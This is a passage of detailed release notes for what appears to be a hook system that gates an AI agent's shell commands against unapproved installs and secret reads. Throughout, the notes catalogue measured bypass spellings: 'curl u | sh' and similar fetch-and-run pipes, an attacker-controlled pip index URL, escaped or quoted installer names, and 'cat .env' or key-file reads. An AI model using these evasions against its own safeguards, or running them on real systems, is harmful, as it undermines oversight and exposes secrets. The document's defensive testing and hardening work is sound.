become a third spelling off `command_spellings`. A decoded run is re-emitted
**still quoted**, or `git commit -m $'pip install evil'` becomes three words and
manufactures the X-36k over-refusal. `$(echo pip)` and the backtick form remain
open as Part 2 — an owner call.

### The attached short index flag was SDK-more-permissive

`pip install -ihttp://evil/simple requests` was shell-deny / SDK-allow,
redirecting an **approved** package to an attacker-controlled index: the shell
arm ends `-i?*|-f?*`, the SDK's `_INDEX_FLAGS` was an exact-match frozenset.
`--default-index` and `--index-strategy` were missing from the SDK set too —
their URL spellings agreed **only by accident**, via the package check. Give
them a local value and the SDK allowed alone.

### Four defects the green suite could not see

All found by adversarial passes on a tree that was passing 7942 checks:

* **The octal branch treated the value as a code point.** Bash treats it as a
  **byte** (`printf '\560'` is `p`), so the shell decoded and both Python copies
  did not — 89 values, SDK-more-permissive. The fix had turned a *symmetric*
  fail-open into an *asymmetric* one, which is **worse than leaving the row
  open**, because parity is the mechanism meant to catch it.
* **The escape regex advanced one character on a non-numeric escape**, so the
  `x41` inside `\\x41` decoded and the SDK denied commands bash never runs.
* **`_param_default` was O(n²)** and a 126 KB command that *passed* at v2.7.1 was
  killed by the 60 s fail-closed ceiling. Chunking alone was measured
  insufficient; a length budget was needed too.
* **The budget compared different units per substrate** — `${#var}` counts bytes
  under `LC_ALL=C` and characters under UTF-8. Now UTF-8 bytes everywhere:
  bytes is the only unit bash can compute in *every* locale.

### Method notes, because they are why the above was found

**Review the plan, not just the code.** Two plan-review passes blocked the #50
plan before a line was written; both of its failures were designed in and would
otherwise have surfaced only after implementation.

**A judge that only scores designs inherits their shared blind spot.** All three
designers reported "0 allow-direction moves"; the judge re-measured and found
144; a reviewer re-measured the judge and found the class was *wider* than its
decomposition claimed.

**A census can only refute what its shapes reach.** The 190-command census that
cleared the guards structurally could not contain the shape where the collateral
lands.

**Reproduce a number before inheriting it.** The plan's O(len²) claim was
withdrawn at implementation: its payload put the long token in an operand, which
is never reduced.

**Mutation-test the guarantee.** Every sweep here was proved *able to fail* by
reverting each fix independently.

**A fresh D3 instance appeared inside the fix for a D3 defect** — two new phase-2
invoker arms spelled from `ALL_INVOKERS` vs `INVOKERS`, inert only because the
reduction cannot return a `DUAL` word. One spelling now, pinned over the emitted
artifacts.

### GitHub mechanics — a recorded trap that was WRONG

The previous release note recorded that *"a stacked PR auto-retargets when its
base branch is **deleted**"*. **That is false.** Merging #49 with
`--delete-branch` **closed** the stacked #51 outright; a closed PR can neither
have its base changed (`Cannot change the base branch of a closed pull request`)
nor be reopened once its base ref is gone. #52 is the same branch and the same
commit, re-opened against `main`. No work was lost, but the recorded rule cost a
PR number and is corrected here.

### Backlog

New rows **X-36q** (a fourth consumer of the reduction — `_invoker_at` leaks 40
of 40 versioned invoker spellings), **X-36r**, **X-36s**, **X-36t**. Still open
and unchanged: X-36a must precede X-36i (i alone ships 161 new
SDK-more-permissive splits); **X-36g is the cluster pivot and needs an owner
posture ruling**; X-36f must not ship alone; X-36b Stage 1 follows g and Stage 2
is barred; X-36h Part 2 is an owner call.


## 2.7.0 → 2.7.1 — the ceiling, the converter, and the word bash resolves (2026-08-04)

**PATCH.** No configuration key exists that did not, and the emitted gates only
got **stricter**. `PROTOCOL_VERSION` in `lib/installer.py` and
`lib/templates.py`, `plugin/plugin.json`'s version and its description prose,
and the version assertions in four suites.

Everything since the `v2.7.0` tag: the `python -m` install bypass and its three
follow-ups (#36, #40, #39, #41), the three defects those fixes shipped, and the
three backlog rows below. **Twenty-plus commits of gate behaviour, none of it
reachable from the newest tag until now** — which is the reason this release
exists rather than waiting.

### X-36l — `dependency-gate` finally has a ceiling

The PRD has stated this rule since 2.6.0, for `secrets-gate`: it matches every
`Bash` call, its pure-bash tokenizer is superlinear, *"an unusually large
command had no ceiling at all"*, and a `PreToolUse` timeout **fails closed** at
the runtime floor, so the bound refuses rather than allows.

Every clause that bears on the bound applies to `dependency-gate` too — same
`Bash` surface, the two hooks byte-identical through line 717, plus an install
anchor with **nested quantifiers** on top. Measured on the emitted hook: **0.9 /
3.6 / 14.6 / 56 s** at 1,000 / 2,000 / 4,000 / 8,000 assignment tokens, ~4× per
doubling. It went four releases without the bound the document already argued
for. It is now **60 s** in both tables.

**The threshold it introduces is measured, not assumed.** A large heredoc write
reaches it first: `cat > src/app.py <<'EOF' … EOF` with a 1,141-line body
(≈47 KB) takes **73 s** and now fails closed where `main` allowed it — and
`secrets-gate`'s existing 60 s ceiling would *not* have caught it (17.8 s on the
same input), because this gate is the slower of the pair. Realistic commands are
nowhere near: a 200-package `pip install` is 0.16 s, an 8 KB `git commit -m`
0.25 s. The bound is still right — the alternative is the no-ceiling state that
was the security finding — but unlike `secrets-gate`'s note, this one does not
claim to be "far above any real command", because at ~46 KB it is not.

This is the half that made the cubic scan a *security* finding: with no ceiling
on either substrate, the SDK ran ~66 s on a 7 KB command while the shell denied
the same command in ~1.2 s — more-permissive reached by **exhaustion** rather
than by a parsing hole.

### X-36j — the converter whose job is to stop the dialects drifting was drifting them

`_py()` rewrote every `(` into `(?:` with a blanket `str.replace`. A `(` inside
a **bracket expression** is a literal, so `prefix_run`'s `[({]` became the class
`[(?:{]` in the emitted SDK — which additionally accepts `?` and `:`. That is
the source of every shell/SDK parity split a 1500-command fuzz found, and it
shipped in v2.7.0.

It is now a small parser that tracks `[...]` and rewrites only outside one.
Written that way deliberately: the alternative — a rule that no `cmdpos` regex
may put `(` inside brackets — is unwritten, unenforced, and had already been
violated.

### X-36h — attempted, measured, reverted; still open

**Not in this release**, and the reason is worth more than the fix would have
been. The obvious approach is to copy `interpreter_word()`'s arm — *a word
carrying `$` or a backtick is an expansion, and an expansion is not a word this
model can resolve.* It works at the **pipe's** command position because a
downloader upstream has already narrowed the context. At a general command
position it does not. Measured: **14 of 40 ordinary commands** newly refused, on
both substrates, each with the unactionable message X-36b is filed for —

```
$KUBECTL get pods                              -> "not in deps.md approved list: pods"
$GIT add src/                                  -> "... : src/"
$HELM install myrelease ./chart                -> "... : myrelease"
sudo make -C $BUILD install DESTDIR=/tmp/stage -> "... : DESTDIR"
```

`$VAR` at command position is ordinary, and `get`/`add`/`i` are ordinary verbs;
the pair is evidence of nothing.

Narrowing to ANSI-C quoting alone failed for a second, separate reason:
`unquote_word` strips `'` before the anchor sees the token, so `$'\x70ip'`
reduces to `$x70ip` and the `$'` signal is destroyed. Any fix keyed on that
construct must inspect the **raw** token rather than the reduced candidate.

Both facts are recorded on X-36h so the next attempt starts from them instead of
from the pipe rule. The six bypass shapes are pinned as `allow` in the
differential corpus, so the gap is legible rather than silent.

### Measured

**Acceptance (KB §7):** the differential corpus × 2 substrates against a
pristine `v2.7.0` install — the *previously denied, now allowed* set is
**empty**. Golden re-baseline: **freeze-exception no. 40**, verified per-file
first; counts stable at **57 / 69 / 59**, and exactly three bodies move —
`dependency-gate.sh`, `sdk_gates/gates.py` and `settings.json`, the last
carrying both the new timeout and the `_generatedBy` stamp.

Suite: **23 suites / 7480 checks / 0 failed.**

**Still open**, recorded rather than claimed closed: X-36a (whitespace class,
safe direction), X-36b (`--python 3.12` names the wrong token), X-36f
(`requests[socks]` refused though approved), X-36g (an escaped package name
splits the substrates), X-36h's substitution half, X-36i (distro ABI spellings
`python3-dbg`/`python3.6m`, and `INSTALL_TOOLS` still spelling the pip family
separately), X-36k (an escaped space joins two words).

## Post-2.7.0 — the three X-36 bypasses, closed (2026-08-04)

Issues **#40, #39, #41**, fixed in that order — remote execution first. All
three were filed off the #36 adversarial review, all three were **pre-existing
and shipped in `v2.7.0`**, and all three were re-measured against a clean
install built from the **`v2.7.0` tag archive** before any code changed.

### #40 (X-36d) — one interpreter set, for the pipe trigger *and* the anchor

The interpreter word had **two private spellings** — `alt(INTERPRETERS) +
"[.0-9]*"` in `interpreter_word()` and `python[0-9.]*` in
`install_head_tail()` — and both missed the same two real binaries. `pypy3` is
the stock PyPy binary; `python3.13t` is CPython 3.13's **free-threaded** build,
which ships under exactly that name.

```
curl u | pypy3          allow/allow   REMOTE EXECUTION of the fetched bytes
curl u | python3.13t    allow/allow   same
pypy3 -m pip install evil  allow/allow   approved-list bypass
```

`PY_INTERPRETERS` and `INTERP_SUFFIX` in `lib/cmdpos.py` are now the one
spelling both read. The `t`/`d` ABI tags also join the **basename reduction**
on both substrates — fixing only the regex would have left the stage
classifier calling `python3.13t` unmodellable while the trigger matched it,
which is two spellings of one question all over again.

### #39 (X-36c) — the leftmost install phrase, not the longest match

`sudo pip install evil npx` was rc=0 on both substrates and really installs
`evil`. bash matches leftmost-**longest**, and the anchor's wrapper arm takes
flags and positionals without bound, so the run ate `pip install evil` and the
anchor matched the trailing `npx`; the match covered the whole segment, the
argument list came back **empty**, and a verb with no arguments reads as a
lockfile restore. Nothing was inspected.

The shape is *"the segment ends on an install phrase"* — add one token and it
denied again, blaming the wrong one, which is how every previous corpus missed
it. **A differential that compares only rc values cannot tell a right answer
from a right answer for the wrong reason.**

Both substrates now grow a candidate one token at a time and take the **first**
prefix the anchor matches. The prefix run is deliberately **not** narrowed —
positionals stay unbounded because `timeout 5 pip install evil` needs them, and
`cmdpos.py`'s ARITY section records the 16-of-27 regression an arity table
caused. Only the *choice of match* changed.

That docstring is corrected too. It argued unbounded consumption "cannot fail
open HERE … the engine backtracks", which is true of **matching** and says
nothing about **which parse is returned** — and `BASH_REMATCH[0]` / `m.end()`
is what slices out the argument tokens. The false half is what made this defect
look impossible.

### #41 (X-36e) — the word bash will actually resolve

Two defects, one cause: the gate judged text bash had already transformed. Both
were shell-allow / SDK-deny, so **the canonical substrate was the one allowing
an unapproved install**.

`pi\p install evil` — bash removes quotes and backslashes before resolving a
word, so `pi\p` names pip, while the hook's `cmd_segments` restores escapes.
`cmd_word`'s quote-removal half is now `unquote_word` (no basename step, since
the anchor carries its own path arm) and the anchor's token scan reads through
it: an existing, tested reduction applied at one more site.

`sh -c 'pi''px install evil'` — adjacent quoted runs are **one word** to bash
(verified: argv is `[sh][-c][pipx install evil]`), but the invoker rule pushed
each *run* as its own segment. The spliced word is now pushed as well,
**additively**, so the change can only add denies.

That second half lives in the shared `_HOOK_HEADER`, which is why
freeze-exception **no. 38 moves 12/12/16 bodies** rather than two — the same
body-only-placeholder break as no. 33, and for the same reason.

### Measured

**Acceptance (KB §7):** 461 distinct commands × 2 substrates against a pristine
`v2.7.0` install. **49 verdicts move allow → deny**; the *previously denied,
now allowed* set is **empty**. That empty set is what makes the "additive"
claim about the tokenizer a measurement rather than an argument.

Freeze-exceptions **no. 36, 37 and 38**, each verified per-file first; counts
stable at 57/69/59 throughout. Suite: **23 suites / 7336 checks / 0 failed**.

**Two `SyntaxWarning` escapes were caught by the project's own guard, not by
me** — `pi\p` written into a `templates.py` comment and into two emitted
`gates.py` docstrings are invalid escape sequences. That is the exact trap
recorded after the #29–#33 batch: invisible locally under a cached `.pyc`,
fatal in CI. Both guards fired.

**One new residue, X-36g, opened rather than ridden:** `pip install requ\ests`
is shell-deny / SDK-allow — the SDK more permissive, the direction the contract
forbids. No fail-open either way (bash resolves it to `requests`, which is
approved, so the SDK matches bash and the shell over-refuses), but it collides
head-on with X-34's deliberate rule that a gate consulting an allow list
refuses decorated spellings. That is an owner call, not a rider.

## 2.6.1 → 2.7.0 — release identity for the five-issue batch (2026-08-03)

**MINOR.** `PROTOCOL_VERSION` 2.6.1 → 2.7.0 in `lib/installer.py` and
`lib/templates.py`, `plugin/plugin.json`'s version **and the version string in
its description prose** with it, and the protocol document's `**Version:**`
header and version-history block.

**Why MINOR and not PATCH — it qualifies on both counts,** where 2.6.0
qualified on one:

1. **Two configuration keys exist that did not.** `commands.execute_in_cwd`
   and `workflow.implementer_isolation` (issue #29). New operator-facing
   surface is additive, not corrective.
2. **The emitted gates change behavior, not merely bytes.** Measured against a
   pristine v2.6.1 install over 2,950 payloads × 2 substrates: **240/270**
   `dependency-gate` and **21/20** `secrets-gate` payloads that 2.6.1 *allowed*
   now deny. Five were live RCEs (`curl u 2>&1 | sh`, `| <newline>sh`,
   `| \sh`, `| 'sh'`, `| ${SHELL}`); three were live secret disclosures.

**Not a seam event.** `SEAM-CONTRACT-v2-0-0.md` §8.4 lists seven triggers and
none fire: no §7.2 tier membership change (no member added or removed), no §7.3
provenance-marker or synthesize-file-contract change, no §7.4 shared sentinel
change, no CLI entry point or contract-level flag, no §4.1/§5 table change, no
`binds` change. The two new keys are **installer inputs**, not seam surfaces,
and `isolation:` is agent frontmatter. §8.4's closing line governs: *"changes
that touch only gate internals or dispatch policy do not bump `seam_version`."*
`seam_version` stays 2.0.0; consumers need no re-pin.

**What 2.7.0 contains** — everything merged since the `v2.6.1` tag, i.e. PRs
**#34** and **#35**: issue #29 (worktree isolation vs. container-run commands),
#30 (the alarm truncating the escalation record it documents), #33 (the
checkpoint stamp and the `/resume` selection rule), and #31/#32 **closed
message-only** after four rounds of attempted gate exemptions were removed and
their deny-direction hardening kept. Plus the `SyntaxWarning` CI fix and its
guard.

**The protocol document keeps its `v2-6-0` filename.** The filename tracks
**doc folds**, not code releases — 2.1.0 was likewise a code MINOR served by
the `v2-0-0` document, and 2.6.1 amended `v2-6-0` in place. Its header and
history block are updated; the content changes for this batch (Phase 2, §6.C,
§6.E, Phase 7 step 6 and the tier-3 demand, Phase 7, Phase 8, Phase 9.5) landed
with the batch itself.

**Golden re-baseline: freeze-exception no. 34**, all three fixtures, verified
per-file first. Action counts stable at **57 / 69 / 59**, 0 added, 0 removed,
and **exactly one** body moves per fixture — `.claude/settings.json` — whose
only differing line, diffed key-by-key against an install built from the
`v2.6.1` tag, is

```
- "_generatedBy": "bootstrap-installer (protocol 2.6.1)",
+ "_generatedBy": "bootstrap-installer (protocol 2.7.0)",
```

No hook, wrapper, skill, command, agent, steering or `sdk_gates` body moves;
the batch's behavioural changes all landed under no. 33 and this exception adds
nothing but the stamp.

**Version surface swept, not assumed.** Beyond the two constants and
`plugin.json`, the release re-pins version assertions in `test_installer.py`
(AC-A0-1/2/3), `test_ic_gate.py` (AC-9-5), `test_gate_substrate.py` and
`test_retrofit.py`. Prose references to v2.6.1 as a *measurement baseline* were
deliberately left alone — they describe what was measured against that release
and are still true.

Suite: 23 suites / 7082 checks / 0 failed.

### X-32i / issue #36 — `python -m` is a command-position prefix, not a `pip` literal

Filed from this batch's residue and **fixed before the tag**, so 2.7.0 carries
it. The install scanner's anchor spelled `python -m pip install` as **one
literal arm**, so the `-m` spelling of every *other* installer walked through
while its direct spelling refused. Measured on a fresh install with
`deps.approved: ["requests"]`, **allow on both substrates**, and identical at
v2.6.1 — pre-existing, not introduced by this batch:

```
python3 -m pipx install evil          allow      pipx install evil        deny
python3 -mpipx install evil           allow      poetry add evil          deny
python3 -m poetry add evil            allow      pipenv install evil      deny
python3 -m pipenv install evil        allow      uv pip install evil      deny
python3 -m uv pip install evil        allow      python3 -m pip install   deny
```

The tools were never unknown to the gate. It refused every one of them at
command position and stopped recognising them behind `-m`.

**`python3 -m uv pip install evil` is why the fix is not an enumeration.** `uv`
has its own anchor arm because its verb is `pip`, not a `VERBS` member — so an
enumerated `-m (TOOLS) (VERBS)` arm matches the other four and **misses that
one**. Instead `python[0-9.]* +-m *` becomes a **transparent command-position
prefix** for the anchor — the treatment `sudo`, `env` and `timeout` already get
— and the remainder is re-judged by the arms that already exist. `-m pip
install`, `-m pipx install` and `-m uv pip install` then fall out of rules
already written, and the literal `-m pip` arm is deleted rather than joined.
That is KB §4.9's rule applied on the first pass instead of the fourth: route
through one model, do not add spellings.

**Consistent with #32, not a reversal of it.** #32 concluded `-m` is *not* a
program flag for the pipe rule, because `python3 -m code` still reads its
program from stdin. Both findings say the same thing — **the module is what
runs**. There it means stdin is still the program; here it means the module is
the installer.

**A second bypass fell out of the same arm.** `/usr/bin/python3 -m pip install
evil` — the ONE spelling the old scanner knew, defeated by a path-qualified
interpreter, because the literal spelled `python` bare. Also allow/allow at
v2.6.1.

**`TOOLS`/`VERBS` were the last forked pair** — one literal in
`lib/templates.py`, a second in `lib/sdk_gates_template.py`, absent from
`lib/cmdpos.py`. That is exactly the two-copies arrangement (round-4 D3) that
`cmdpos.py` exists to prevent, and the reason a fix applied to one substrate
could silently miss the other. Both substrates now render
`cmdpos.install_head_tail()`, so shell/SDK parity for this anchor is a property
of the code rather than a comment. `tests/test_composition.py` pins five set
members as appearing **nowhere** outside `cmdpos.py`.

**The X-32 F14 comment is corrected, not left standing.** It claimed
"`-mpipx install` does not match" as a *safety* property of the `-m *pip`
widening. After this change it **does** match, on purpose, so the claim is
retired at both sites rather than left to become a false comment (KB §4.8).

**The first cut of this fix was itself incomplete, and an adversarial pass
caught it.** Going from the interpreter word straight to `-m` left the whole
bypass alive behind three more characters — `python3 -E -s -m pipx install
evil`, `-I -m`, `-X utf8 -m`, `-q -m` were all allow on both substrates, and
every one of those flag forms really runs the module. The tell was that `sudo
python3 -E -s -m pipx install evil` **denied**: `sudo`'s arm absorbs a flag run
and finds `pipx install` underneath, so the gap was a modelling omission rather
than a limit. The interpreter word now carries a flag run of its own.

**That run is bounded — a flag with at most one operand — and the bound is
load-bearing in both directions.** `prefix_run`'s unbounded
`(flag|positional)*` would **fail open** here: bash matches leftmost-*longest*,
and `head_txt`/`m.end()` is what selects the tokens the package scan reads, so
a positional arm lets the run reach a *second* `-m` in `python3 -m pip install
evil python3 -m pip install`, ending the match on a trailing bare verb the gate
reads as a lockfile restore — inspecting nothing. Requiring every iteration to
begin with `-` stops the run dead at `install`. A flag-*only* run would have
been too narrow the other way, missing `-X utf8` and `-W ignore`. The false
positive the bound buys is the one that matters: `python3 script.py -m pipx
install evil` merely passes those words to a script as argv, and stays allowed.

**Acceptance, per the KB §7 release criterion:** a pristine baseline built from
`8276300` (= the 2.7.0 release commit), the differential suite's full corpus of
**411 distinct commands** driven through **both substrates** on both builds.
Result: **40 verdicts move allow → deny** (the twenty #36 spellings × two
substrates), and the *previously-denied, now-allowed* set is **empty**. No
verdict regressed in the fail-open direction on either substrate.

**Six residues were opened rather than quietly fixed**, all measured and all
pre-existing: **X-36a** (the shell/SDK whitespace-class split, in the safe
direction), **X-36b** (`--python 3.12` blames the wrong token), **X-36c** (a
wrapper word's unbounded skip swallows the package list — `sudo pip install
evil npx` is a real fail-open on both substrates), **X-36d** (`pypy3` and
`python3.13t` are unknown to the interpreter word *and* to the pipe trigger,
where `curl u | pypy3` is a live remote-execution hole), **X-36e** (an escaped
installer word, `pi\p install evil`, bypasses the shell hook only), **X-36f**
(an APPROVED package with extras, `pip install requests[socks]`, is refused).
Each needs its own measurement; riding them on this change is the treadmill
KB §4.9 is about.

**The three that are real bypasses are now issues #39 (X-36c), #40 (X-36d) and
#41 (X-36e)**, each re-measured against a clean install from the `v2.7.0` tag
rather than inherited from the review. X-36a is in the safe direction and
X-36b/X-36f are wrong-token and over-refusal defects, so they stay backlog
rows — the same split X-32i got before it became issue #36.

**Golden re-baseline: freeze-exception no. 35**, all three fixtures, verified
per-file first. Action counts stable at **57 / 69 / 59**, 0 added, 0 removed,
and **exactly two** bodies move per fixture — `.claude/hooks/dependency-gate.sh`
and `.claude/sdk_gates/gates.py`, precisely the two the install anchor is
rendered into. Nothing else moves; `secrets-gate.sh` is byte-identical against
an install built from `8276300`. `dependency-gate.sh` additionally moves for a
**comment-only** correction the same adversarial pass found: the "KNOWN AND
ACCEPTED" note claimed `git commit -m "fix; npm install evil"` *blocks*, which
has been false since `cmd_segments` became quote-aware (F-435) — measured rc=0
both here and at `8276300`.

Suite: 23 suites / 7180 checks / 0 failed.

## 2.6.1 in-version fixes — four issues, and two over-refusals that could not be safely relaxed (2026-08-03)

GitHub issues **#30, #31, #32, #33**, filed against 2.6.1 alongside #29.
**#30 and #33 are fixed. #31 and #32 are closed message-only**, with their gate
behaviour deliberately unchanged — and the gates left **strictly stronger than
2.6.1**. The reasoning is the valuable part; see KB §4.9.

### X-30 — the alarm truncated the escalation record it is documented to preserve

The protocol instructs the agent, in two normative places, to write four fields
— timestamp, escalation reason, what it was about to do, what input it needs —
into `.claude/sessions/.decision-pending-<session-id>`. The emitted hook ran
`: >"$P"` on **every fire**. A conforming agent and a conforming hook **could
not both be right**; measured on a real install, all eight `.decision-pending-*`
files were 0 bytes.

Not a tidiness defect. Phase 9.5 promises the operator "the decision-pending
file **ready for action**" after an unattended halt. Ready for action was a
filename.

**Which half to fix was the whole question**, and the issue honestly flagged its
own answer as unverified — the truncate sits between `mkdir -p` and a
`find -mtime +7 -delete`, so it *reads* as a latch. Settled by asking something
checkable: **does anything read this file's contents, or key on its emptiness?**
Nothing does. So the truncate was collateral, the hook was the wrong half to
keep, and the documented contract stands. Fixed hook-side: create-if-absent +
`touch`.

### X-33 — `/resume` had no selection rule; `/checkpoint` stamped from model memory

The emitted `/resume` body was **one sentence**; "most recent" was undefined, so
an agent picked differently each session. `/checkpoint` named files from a
model-supplied timestamp that had run ahead of true UTC **twice** on a real
install, so filename order and actual age disagreed and a name sort loaded the
**oldest** state while believing it newest.

Fixed both ends: `/checkpoint` stamps from the clock (`date -u +%Y-%m-%dT%H%MZ`,
verbatim); `/resume` states three rules **in precedence order** — a named
checkpoint **ends** selection, otherwise resolve by **mtime never filename
sort**, and the banner cross-check applies **only** to the mtime path. The
scoping was itself a fix: the first cut said a named checkpoint "always wins"
and then let rule 3 walk off it — the X-30 shape, inside the fix for a different
issue. It recurred a third time in a Companion row and was caught by the
verification pass.

**The clock rule now binds every producer**, not just `/checkpoint`: Phase 7
step 6 carries the normative statement, and the tier-3 drift demand, its stderr
text and `RETROFIT.md` each state it inline. Those are the **unattended** write
paths, and they are the ones that matter — `/resume` loads by mtime while a
human reading the directory sorts by name, with nobody watching.

### X-31 / X-32 — the two over-refusals, and why the exemptions were removed

Both issues are real:

- `secrets-gate` refused `rg -g '!*.pem'` — a **negated** glob that *excludes*
  the protected path, i.e. a command reading strictly fewer files than the bare
  `rg` it allowed.
- `dependency-gate` refused `curl … | python3 -c '<prog>'` — where `-c` supplies
  the program and the fetched bytes are **data on stdin**.

Both were filed as **usability** defects erring in the safe direction, and both
issues name a clean workaround themselves. Implementing either means **widening
a deny-list control**, which is a security change however it was filed.

**Four rounds tried. Each closed its own findings and the next pass broke it:**

| round | blocking fail-opens found | representative |
|---|---|---|
| 1 | 4 | sticky arm exempts a whole run of tokens |
| 2 | 6 | `rg -g '\!*.pem'` — a backslash makes it a **positive** glob |
| 3 | 12 | `python3 -m code` — `-m` names a module, and `code` is a stdin REPL |
| 4 (architectural) | ~20 | `node -p`; a trailing `#` comment; a subshell |

Round 4 went after the primitives, not the spellings — routing both walks
through the shared command-position model, canonicalizing the write set into
paths, widening the writer set, fixing the tokenizer. Right diagnosis, still no
convergence: the exemption's precondition is *"parse this command the way bash
and then ripgrep/CPython will"*, and a gate that must answer that exactly has
taken on an adversary's entire grammar.

**So the relaxations were removed and the hardening was kept.** That split is
the outcome worth recording. Measured against a pristine v2.6.1 install, the
same rounds had closed five pre-existing fail-opens unrelated to the exemptions:

```
curl … 2>&1 | sh        2.6.1 ALLOW -> DENY
curl … |<newline>sh     2.6.1 ALLOW -> DENY
curl … | \sh            2.6.1 ALLOW -> DENY
curl … | 'sh'           2.6.1 ALLOW -> DENY
curl … | ${SHELL}       2.6.1 ALLOW -> DENY
```

and the three the exemptions had opened went away with them. **Net: strictly
stronger than 2.6.1, zero new fail-opens.**

**#31 and #32 are answered the way their own Impact sections ask for — a better
refusal.** #31 says *"the refusal text does not hint at [the workaround]"*; #32
says the message *"describes a situation the operator is not in and sends them
looking for an installer that does not exist."* Both messages now name what was
refused, why, and the concrete next step: a positive glob scope for
`secrets-gate`, and write-then-read (or a dedicated fetch tool) for
`dependency-gate`. A better refusal costs nothing and cannot fail open.

**Release criterion adopted from this episode** (KB §7): no change to a control
ships without the previous-release diff — install the last tag and the
candidate, run one corpus through both substrates of both, and require the
"previously denied, now allowed" set to be **empty**. That question ended this
episode; "did we close our findings" never could, because every round could
answer yes.

### Verification

Golden re-baseline: **freeze-exception no. 33**, all three fixtures, verified
per-file before re-baselining. Action counts stable at **57 / 69 / 59**, 0
added, 0 removed; **16 / 20 / 16** bodies move. That is *every emitted hook in
each fixture* (11 / 15 / 11) plus `.claude/sdk_gates/gates.py`, the two `#33`
skill bodies, and the two steering docs carrying the message-only prose
(`deps.md`, `secrets.md`). All eleven-plus hooks move because
`normalize_command` and the command-position model live in the shared
`_HOOK_HEADER` — a deliberate break of the old body-only-placeholder property,
recorded because a per-command normalization every gate must share cannot live
in one gate's body. No wrapper, agent, settings, command or spec body moves.

**The acceptance measurement, stated exactly.** Corpus of 2,950 payloads ×
2 substrates against a pristine v2.6.1 install. Payloads 2.6.1 **allowed** that
this tree **denies**: 240/270 (dependency-gate) and 21/20 (secrets-gate) — the
win. Payloads 2.6.1 **denied** that this tree **allows**: **one**, down from a class
of **66** — and the size of that class is itself the lesson.

A first pass sampled six and read them as isolated oddities. A systematic
decoration sweep against a pristine 2.6.1 install found **66** (50 in
`secrets-gate`, 16 in `dependency-gate`), and none was attributable to the
removed exemptions. Each was a no-op mutation (`$''`, `$'…'`, `$""`, a trailing
backslash, a line continuation) applied to a name on an **allow-list** —
`requests` in `deps.approved`, `.env.example` in the dotenv-template carve-out.
2.6.1 denied them because its tokenizer could not see through the mutation and
so failed to recognise the allow-list entry. **Nothing in the round's own test
suite noticed, because every test had been written about the deny direction the
fold was added for** — and the same sweep over the three Bash gates that hold no
allow list (`test-gate`, `spec-gate-commit`, `ci-mirror`) moved *nothing*, which
is the evidence that the allow list, not the fold, is the thing to look for.
**That diagnosis produced a real architectural fix rather than a spelling
patch:** folding is sound for a deny list (it can only make *more* spellings
reach a forbidden name) and unsound for an allow list (it hands the exemption to
spellings that never earned it). So **a gate that consults an allow list now
judges both spellings — the folded one and the one the operator typed — and
refuses if either refuses.** The unfolded pass feeds the walk exactly the string
2.6.1 fed it, so the union is a superset of 2.6.1's denies *by construction*, with
nothing to keep in sync with the normalizer. That closed five of the six.

The survivor is `cp '.env.example ;` — an unbalanced quote naming an
allow-listed **template**, on a command **bash itself refuses to parse**
(`unexpected EOF while looking for matching '`). 2.6.1 allows the same thing
without the trailing `;`. It is recorded rather than chased: special-casing it
ahead of the allow list is the spelling-patch treadmill that cost four rounds.

The deny-list side is unaffected throughout — `npm install evil$''`,
`npm install $'evil'`, `cat .env.production$''`, `cat .env.example.real$''` and
`cat 'secrets/prod.yaml ;` deny at both versions — and the same normalization
closes live secret disclosures 2.6.1 shipped: `cat important.pem$''`,
`cat tls.key$''`, `cat $'secrets/prod.yaml'` and `cat 'important.pem ;` were all
rc=0 at 2.6.1 and are rc=2 here. Verified independently by execution, not taken
from a report.

Also closed by the kept hardening, having been fail-open at 2.6.1 and found
while investigating #32: `curl u | (sh)`, `| { sh; }`, `| FOO=1 sh`,
`| python3.11`, `curl u 2>&1 | sh`, and a control operator inside a quoted
filename (`tee 'a;b.sh'`). Backlog **X-32e**, now `done`.

Residue: backlog **cluster X**, including `python -m pipx/poetry/pipenv/uv`
installs (open in both spellings, pre-existing) which deserves its own issue.

Suite: **23 suites / 6910 checks / 0 failed** (from 21 / 1905 at v2.6.1).


## 2.6.0 → 2.6.1 — release identity for the post-tag fixes (2026-07-31)

**PATCH.** `PROTOCOL_VERSION` 2.6.0 → 2.6.1 in `lib/installer.py` and
`lib/templates.py`, `plugin/plugin.json` version + description with it, and the
protocol document's version header and history.

**Why now, and why a bump rather than a bare tag.** Freeze-exceptions **18, 20,
21, 23 and 25** each declined to bump, every one on the stated grounds that
*"2.6.0 is unreleased, v2.5.0 remains the only tag"* and that *"a bump is owed
when 2.6.0 is actually tagged."* v2.6.0 was tagged on 2026-07-30 (`f6bded0`),
so the debt came due — and it is not bookkeeping:

```
broken-but-present jq, python3 healthy      v2.6.0 (f6bded0)   2.6.1
  secrets-gate     cat .env                   rc=0 ALLOWED     rc=2
  dependency-gate  npm install evil           rc=0 ALLOWED     rc=2
```

**The tag as published fails open** (P0-3d), and seventeen commits of fixes sat
behind it untagged. Tagging those fixes *without* a bump would have stamped
`bootstrap_protocol_version: "2.6.0"` into installs made from a `v2.6.1` tag —
a version claim the artifact itself denies, and an operator could not tell the
two apart by inspecting their own tree. That is the §4.5 disclosure-accuracy
class the three preceding PRs were spent removing; reintroducing it in the
release step would have been a poor joke.

**What 2.6.1 contains** — everything merged since the v2.6.0 tag: the `jget`
parser-usability fix (P0-3d) and its regression substrates; the autonomous-mode
exit contract; the security KB's P0-3d entry and §4.6, plus two adversarial
passes that corrected the document's own counts; **§6.D corrected, because it
instructed authors to gate on `command -v jq`**; 33 phantom `v2.6.1`/`v2.6.2`
citations retired; and O-3/P-9/P-10 closed — a refusal is not a run outcome.

**Golden re-baseline: freeze-exception no. 31**, all three fixtures. Verified
per-file before re-baselining: exactly **one** body moves per fixture,
`.claude/settings.json`, action counts stable at **57 / 69 / 59**, 0 added, 0
removed, and the only differing line is

```
- "_generatedBy": "bootstrap-installer (protocol 2.6.0)",
+ "_generatedBy": "bootstrap-installer (protocol 2.6.1)",
```

No hook, wrapper, skill, command or agent body moves; no gate behaviour changes
in this commit. The `exit_reason` enum stays at 13 values.

Suite: 21 suites / 1905 checks / 0 failed.


## 2.6.0 in-version fix — a refusal is not a run outcome (2026-07-31)

Closes the three owner decisions that were blocking a release tag: **O-3**,
**P-9** and **P-10**.

**The question O-3 asked was the wrong shape.** It framed the choice as
*"should the `exit_reason` enum gain a 14th value, `skeleton-not-implemented`?"*
and recorded the blocker as contract surface — the enum is pinned at exactly 13
by `tests/test_usage_limit_contract.py`, documented in `auto.sh`'s header, and
rendered by the morning-after summary. Two findings changed the answer.

**The enum is queue-scoped by the protocol, not just by the pin.** P-10 noted
